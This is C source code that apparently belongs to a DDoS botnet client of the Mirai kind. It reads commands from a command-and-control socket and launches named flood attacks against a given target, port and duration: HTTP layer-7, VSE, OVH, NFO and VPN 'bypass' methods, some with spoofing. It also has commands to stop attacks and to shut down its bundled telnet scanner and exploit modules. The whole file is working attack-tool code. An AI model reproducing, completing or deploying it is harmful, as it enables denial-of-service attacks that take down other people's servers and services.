#define _GNU_SOURCE
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <wait.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include "headers/attack.h"
#include "headers/commands.h"
#include "headers/connection.h"
#include "headers/killer.h"
#include "headers/telnet.h"
#include "headers/exploit.h"
#include "headers/util.h"

void commands_process(int argc, unsigned char **argv)
{   
    char httpSuperString[] = {"HTTPNULL"}; //LAYER 7 METHOD START
    if(strstr(argv[0], httpSuperString))
    {
        if(argc < 4)
        {
            return;
        }
        if(atoi(argv[3]) < 3600)
        {
            return;
        }
        if(!attack_listfork())
        {
            ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        }
    }
    char sendStdHexString[] = {"STDHEX"}; 
    if(strstr(argv[0], sendStdHexString)) 
    {
        if(argc < 4)
        {
            return;
        }
        if(atoi(argv[3]) < 3600)
        {
            return;
        }
        if(!attack_listfork())
        {
            sendBypassTwo(argv[1], atoi(argv[2]), atoi(argv[3]));
        }
    }
    char sendVseStr[] = {"VSE"}; 
    if(strstr(argv[0], sendVseStr)) 
    {
        if(argc < 4)
        {
            return;
        }
        if(atoi(argv[3]) < 3600)
        {
            return;
        }
        int spoofed = atoi(argv[4]);
        int packetsize = 1024;
        int pollInt = 1000;
        int sleepcheck = 1000000;
        int sleeptime = 0;
        if(!attack_listfork())
        {
            vseattack(argv[1], atoi(argv[2]), atoi(argv[3]), spoofed, packetsize, pollInt, sleepcheck, sleeptime);
        }
    }
    char sendRandString[] = {"RAND"}; 
    if(strstr(argv[0], sendRandString)) 
    {
        if(argc < 4)
        {
            return;
        }
        if(atoi(argv[3]) < 3600)
        {
            return;
        }
        if(!attack_listfork())
        {
            Randhex(argv[1], atoi(argv[2]), atoi(argv[3]));
        }
    }
    char sendOvhString[] = {"OVH"}; //START OF OVH METHODS
    if(strstr(argv[0], sendOvhString)) 
    {
        if(argc < 4)
        {
            return;
        }
        if(atoi(argv[3]) < 3600)
        {
            return;
        }
        if(!attack_listfork())
        {
            sendBypassOne(argv[1], atoi(argv[2]), atoi(argv[3]));
        }
    }
    char sendNfoStr[] = {"NFO"}; 
    if(strstr(argv[0], sendNfoStr)) 
    {
        if(argc < 4)
        {
            return;
        }
        if(atoi(argv[3]) < 3600)
        {
            return;
        }
        int spoofed = atoi(argv[4]);
        int packetsize = 1024;
        int pollInt = 1000;
        int sleepcheck = 1000000;
        int sleeptime = 0;
        if(!attack_listfork())
        {
            vseattack(argv[1], atoi(argv[2]), atoi(argv[3]), spoofed, packetsize, pollInt, sleepcheck, sleeptime);
        }
    }
    char sendVpnString[] = {"VPN"}; //START OF OVH METHODS
    if(strstr(argv[0], sendVpnString)) 
    {
        if(argc < 4)
        {
            return;
        }
        if(atoi(argv[3]) < 3600)
        {
            return;
        }
        if(!attack_listfork())
        {
            sendBypassThree(argv[1], atoi(argv[2]), atoi(argv[3]));
        }
    }
    char enc_killattk[] = {"STOP"};
    if(strstr(argv[0], enc_killattk))
    {
        attack_kill();
    }
	char enc_botkill[] = {"botkill"};
    if(strstr(argv[0], enc_botkill))
    {
        killer_kill();
        telnet_kill();
        exploit_kill();
        exit(0);
	}
}

void commands_parse()
{
    char buf[512];
    while(read(cncsocket,buf,sizeof(buf)))
    {
        int g;
        int argcount=0;
        unsigned char *buffer[512];
        char *split;
        for(split = strtok(buf," "); split != NULL; split = strtok(NULL, " "))
        {
            buffer[argcount++] = malloc(strlen(split) + 1);
            strcpy(buffer[argcount-1], split);
        }
        commands_process(argcount, buffer);
        for(g=0; g<argcount; g++)
        {
            free(buffer[g]);
        }
    }
}
